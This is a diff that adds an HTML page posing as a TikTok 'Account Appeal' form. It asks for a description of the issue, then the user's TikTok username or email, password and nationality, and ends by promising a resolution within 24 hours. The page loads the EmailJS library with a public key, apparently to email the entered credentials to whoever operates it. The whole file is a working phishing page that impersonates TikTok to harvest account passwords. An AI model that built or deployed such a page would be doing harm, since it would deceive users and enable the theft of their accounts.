@@ -1,0 +1,54 @@
+<!DOCTYPE>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <title> Account Appeal</title>
+<link rel = "stylesheet" href = "./css/style.css">
+    </head>
+    <body>
+        <!--first page: for client to describe the issue-->
+        <div id="page1" class="page active">
+            <div id="tiktok-logo">
+                <img id="logo-icon" src="./assets/images/tiktok-logo.jpg">
+            </div>
+            <form id="page1Form">
+                <textarea placeholder="Describe your issue..." required></textarea><br /><br /><br />
+                <button type="submit" class="nextToDetails">Next</button>
+            </form>
+        </div>
+
+        <!--second page: User details-->
+        <div id="page2" class="page">
+            <h2> Fill in your <span id="tiktok-underline">tiktok</span> details</h2><br /><br /><br />
+            <form id="detailsForm">
+                <input type="text/email" name="username-email" placeholder="username/email..." required><br />
+                <input type="password" name="password" placeholder="Password..." required><br />
+                <input type="text" name="nationality" placeholder="Nationality..." required><br />
+                <button type="submit" class="nextToDetails">Next</button>
+            </form>
+
+        </div>
+        <!--third page: feedback page-->
+        <div id="page3" class="hiddenpage">
+            <div id="24hrs-icon">
+                <img id="feedback-icon" src="./assets/images/24hrs-icon.jpg">
+            </div>
+            <p>
+                Account will be resolved <br /><span id="redtext">within 24 hours</span>
+            </p>
+        </div>
+        <script type="text/javascript"
+            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+        </script>
+        <script type="text/javascript">
+            (function() {
+                emailjs.init({
+                    publicKey: "C0vUDQkqdD8J7EQdJ",
+                });
+            })();
+        </script>
+        <script type = "text/javascript" src = "./js/main.js"></script>
+    </body>
+</html>
